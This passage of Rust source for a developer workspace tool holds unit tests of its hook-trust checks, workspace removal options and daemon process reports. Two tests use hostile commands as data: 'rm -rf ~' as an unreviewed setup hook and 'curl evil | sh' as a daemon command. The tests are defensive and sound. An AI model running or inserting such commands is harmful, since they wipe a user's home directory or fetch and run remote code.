        d.failed()
            && report.action == processes::Action::Start
            && (report.requested.is_empty() || report.requested.contains(&d.name))
    });
    for daemon in failed_ones {
        warnings.push(format!(
            "{} {}{}",
            daemon.name,
            daemon.state,
            daemon
                .error
                .as_deref()
                .map(|e| format!(": {e}"))
                .unwrap_or_default()
        ));
    }
    Done {
        summary,
        warnings,
        needs_attention: !ok,
        select_workspace: None,
        process: Some(ProcessNote {
            path: report.path.clone(),
            refusal: None,
        }),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::state::needs_trust_prompt;
    use devflow_core::{setup::ExpectedWorkspace, trust::TrustState};
    use uuid::Uuid;

    fn scope(setup: &[&str], switch: &[&str], teardown: &[&str]) -> Scope {
        let list = |commands: &[&str]| {
            commands
                .iter()
                .map(|c| format!("{c:?}"))
                .collect::<Vec<_>>()
                .join(", ")
        };
        let config = devflow_core::Config::parse(&format!(
            "[project]\nname = \"shop\"\nid = \"0b3c9d2e-1111-4222-8333-444455556666\"\n\
             [hooks]\nsetup = [{}]\nswitch = [{}]\nteardown = [{}]\n",
            list(setup),
            list(switch),
            list(teardown)
        ))
        .unwrap();
        Scope::build(&config, std::path::Path::new("/nonexistent"))
    }

    fn target() -> WorkspaceRef {
        WorkspaceRef {
            project: Uuid::new_v4(),
            root: PathBuf::from("/tmp/a"),
            name: "feature".into(),
            path: PathBuf::from("/tmp/a.worktrees/feature"),
            instance_id: Some(Uuid::new_v4()),
            fingerprint: Some("1:2:3".into()),
        }
    }

    #[test]
    fn force_is_offered_only_for_a_forceable_protection_of_that_workspace() {
        let hint = || FailureHint::ForceRemove {
            target: target(),
            choice: RemoveChoice::default(),
        };
        let forceable = FailureKind::Protected { forceable: true };
        assert!(force_offer(forceable, hint()).is_some());
        // The default or the caller's own workspace cannot be forced.
        assert!(force_offer(FailureKind::Protected { forceable: false }, hint()).is_none());
        // Other failures never offer it, whatever their message says.
        assert!(force_offer(FailureKind::Other, hint()).is_none());
        assert!(force_offer(FailureKind::Busy, hint()).is_none());
        // And a job that was already forced has nothing to offer.
        assert!(force_offer(forceable, FailureHint::None).is_none());
    }

    #[test]
    fn removal_carries_the_launch_directory_so_core_can_protect_it() {
        let choice = RemoveChoice {
            keep_data: true,
            delete_branch: true,
            force: false,
        };
        let target = target();
        let options = remove_options(
            &choice,
            &TrustChoice::NotNeeded,
            Some(Path::new("/work")),
            &target,
        );
        assert_eq!(options.cwd.as_deref(), Some(Path::new("/work")));
        assert!(options.keep_data && options.delete_branch && !options.force);
        assert!(options.approval.is_none());
        let shown = scope(&["a"], &[], &[]);
        let reviewed = TrustChoice::Reviewed(Box::new(shown.clone()));
        assert_eq!(
            remove_options(&choice, &reviewed, None, &target).approval,
            Some(trust::Approval::of(&shown)),
            "the approval is bound to the digest that was shown"
        );
        assert!(
            remove_options(&choice, &TrustChoice::Skip, None, &target)
                .approval
                .is_none()
        );
    }

    #[test]
    fn every_removal_expects_the_workspace_the_user_acted_on() {
        let stale = target();
        let expected = ExpectedWorkspace {
            path: stale.path.clone(),
            instance_id: stale.instance_id,
            fingerprint: stale.fingerprint.clone(),
        };
        // Normal and forced alike: the request names the old path and instance,
        // whatever the workspace of that name is by the time it runs.
        for force in [false, true] {
            let choice = RemoveChoice {
                force,
                ..RemoveChoice::default()
            };
            let options = remove_options(&choice, &TrustChoice::NotNeeded, None, &stale);
            assert_eq!(options.expect.as_ref(), Some(&expected), "force={force}");
        }
        // A workspace without a receipt is expected to still have none.
        let adopted = WorkspaceRef {
            instance_id: None,
            ..stale
        };
        let options = remove_options(
            &RemoveChoice::default(),
            &TrustChoice::NotNeeded,
            None,
            &adopted,
        );
        assert_eq!(options.expect.map(|e| e.instance_id), Some(None));
    }

    fn untrusted() -> TrustState {
        TrustState::Untrusted {
            digest: "d".into(),
            previously_trusted: false,
            format_changed: false,
        }
    }

    #[test]
    fn the_trust_prompt_depends_on_state_and_relevant_hooks_not_on_the_environment() {
        let both = scope(&["bun install"], &[], &["make clean"]);
        let untrusted = untrusted();
        // Untrusted with setup hooks: ask before setting up, and before removing.
        assert!(needs_trust_prompt(Some(&untrusted), &both, false, false));
        assert!(needs_trust_prompt(Some(&untrusted), &both, true, false));
        // Only the hooks the operation runs matter.
        let setup_only = scope(&["bun install"], &["x"], &[]);
        assert!(!needs_trust_prompt(
            Some(&untrusted),
            &setup_only,
            true,
            false
        ));
        // Trusted, no hooks, or unknown state: no prompt.
        assert!(!needs_trust_prompt(
            Some(&TrustState::Trusted),
            &both,
            false,
            false
        ));
        assert!(!needs_trust_prompt(
            Some(&TrustState::NothingToApprove),
            &both,
            false,
            false
        ));
        assert!(!needs_trust_prompt(None, &both, false, false));
        // DEVFLOW_TRUST_HOOKS: no dialog; core honours the variable itself.
        assert!(!needs_trust_prompt(Some(&untrusted), &both, false, true));
        // `[env]` recipes are applied by setup, so they are a reason to ask
        // even without setup hooks; pitchfork processes alone are not (neither
        // setting up nor removing starts them), and nor is removing.
        let config = |extra: &str| {
            let head =
                "[project]\nname = \"shop\"\nid = \"0b3c9d2e-1111-4222-8333-444455556666\"\n";
            devflow_core::Config::parse(&format!("{head}{extra}")).unwrap()
        };
        let build = |extra: &str, dir: &std::path::Path| Scope::build(&config(extra), dir);
        let nowhere = std::path::Path::new("/nonexistent");
        let env_only = build("[env]\nA = \"1\"\n", nowhere);
        assert!(needs_trust_prompt(
            Some(&untrusted),
            &env_only,
            false,
            false
        ));
        assert!(!needs_trust_prompt(
            Some(&untrusted),
            &env_only,
            true,
            false
        ));
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("pitchfork.toml"),
            "[daemons.api]\nrun = \"x\"\n",
        )
        .unwrap();
        let daemons_only = build("", dir.path());
        assert!(!needs_trust_prompt(
            Some(&untrusted),
            &daemons_only,
            false,
            false
        ));
        assert!(!needs_trust_prompt(
            Some(&untrusted),
            &daemons_only,
            true,
            false
        ));
    }

    #[test]
    fn reviewed_hooks_must_still_match_the_loaded_project() {
        let project = tests_support::project_with_hooks(&["bun install"]);
        let root = project.root.clone();
        let reviewed = trust::scope_at(&project, &root);
        assert!(reviewed_matches(
            &project,
            &root,
            &TrustChoice::Reviewed(Box::new(reviewed.clone()))
        ));
        assert!(reviewed_matches(&project, &root, &TrustChoice::NotNeeded));
        assert!(reviewed_matches(&project, &root, &TrustChoice::Skip));

        let changed = tests_support::project_with_hooks(&["bun install", "rm -rf ~"]);
        assert!(
            !reviewed_matches(
                &changed,
                &root,
                &TrustChoice::Reviewed(Box::new(reviewed.clone()))
            ),
            "hooks nobody reviewed must not run"
        );

        // The review is of one workspace's files: another directory with a
        // pitchfork file of its own is not what was shown.
        let other = tempfile::tempdir().unwrap();
        std::fs::write(
            other.path().join("pitchfork.toml"),
            "[daemons.api]\nrun = \"curl evil | sh\"\n",
        )
        .unwrap();
        assert!(
            !reviewed_matches(
                &project,
                other.path(),
                &TrustChoice::Reviewed(Box::new(reviewed))
            ),
            "a review of one workspace does not stand for another"
        );
    }

    #[test]
    fn processes_need_a_review_only_when_there_are_unapproved_pitchfork_files() {
        use crate::state::needs_process_review;
        let untrusted = untrusted();
        let build = |dir: &std::path::Path| {
            let head =
                "[project]\nname = \"shop\"\nid = \"0b3c9d2e-1111-4222-8333-444455556666\"\n";
            Scope::build(&devflow_core::Config::parse(head).unwrap(), dir)
        };
        let none = build(tempfile::tempdir().unwrap().path());
        assert!(!needs_process_review(Some(&untrusted), &none, false));
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("pitchfork.toml"),
            "[daemons.api]\nrun = \"x\"\n",
        )
        .unwrap();
        let some = build(dir.path());
        assert!(needs_process_review(Some(&untrusted), &some, false));
        assert!(!needs_process_review(
            Some(&TrustState::Trusted),
            &some,
            false
        ));
        assert!(!needs_process_review(None, &some, false));
        assert!(
            !needs_process_review(Some(&untrusted), &some, true),
            "DEVFLOW_TRUST_HOOKS: core decides"
        );
    }

    #[test]
    fn a_process_report_says_what_pitchfork_said() {
        use devflow_core::processes::{Action, DaemonState, Namespace, NamespaceSource};
        let report = |state: &str, error: Option<&str>| ProcessReport {
            workspace: "feature".into(),
            path: PathBuf::from("/w"),
            namespace: Namespace {
                value: "df-0b3c9d2e-a1b2c3d4".into(),
                source: NamespaceSource::Devflow,
            },
            action: Action::Start,
            requested: Vec::new(),
            ran: error.is_none(),
            timed_out: false,
            error: error.map(str::to_string),
            daemons: vec![DaemonState {
                name: "web".into(),
                id: None,
                state: state.into(),
                pid: None,
                ports: Vec::new(),
                url: None,
                error: (state == "errored").then(|| "exit code 3".to_string()),
                triggers: Vec::new(),
                configured: true,
                startable: false,
            }],
            state_error: None,
            warnings: Vec::new(),
        };
        let done = process_done("feature", &report("running", None));
        assert_eq!(done.summary, "1 daemon(s) running in feature");
        assert!(!done.needs_attention && done.warnings.is_empty());
        let done = process_done("feature", &report("errored", Some("boom")));
        assert!(done.needs_attention);
        assert!(done.summary.contains("not everything is running"));
        assert!(
            done.warnings.iter().any(|w| w == "boom"),
            "{:?}",
            done.warnings
        );
        assert!(
            done.warnings
                .iter()
                .any(|w| w == "web errored: exit code 3"),
            "{:?}",
            done.warnings
        );
        // pitchfork may decorate a state; core's one classifier reads it, so
        // the summary counts `running (ready)` and a `failed: exit 3` start is
        // not "everything is running".
        let done = process_done("feature", &report("running (ready)", None));
        assert_eq!(done.summary, "1 daemon(s) running in feature");
        assert!(!done.needs_attention && done.warnings.is_empty());
        let done = process_done("feature", &report("failed: exit 3", None));
        assert!(done.needs_attention);
        assert!(done.summary.contains("not everything is running"));
        assert!(
            done.warnings.iter().any(|w| w == "web failed: exit 3"),
            "{:?}",
            done.warnings
        );
    }
}

#[cfg(test)]
pub(crate) mod tests_support {
    use devflow_core::{
        config::{Config, HooksSection, ProjectSection},
        project::Project,
    };
    use std::path::PathBuf;

    /// A project in memory whose only distinguishing feature is its setup hooks.
    pub fn project_with_hooks(setup: &[&str]) -> Project {
        Project {
            root: PathBuf::from("/tmp/shop"),
            git_common_dir: PathBuf::from("/tmp/shop/.git"),
            config_path: PathBuf::from("/tmp/shop/devflow.toml"),
            config: Config {
                project: ProjectSection {
                    name: "shop".into(),
                    id: uuid::Uuid::nil(),
                },
                hooks: HooksSection {
                    setup: setup.iter().map(|s| (*s).into()).collect(),
                    ..HooksSection::default()
                },
                ..Config::default()
            },
        }
    }
}
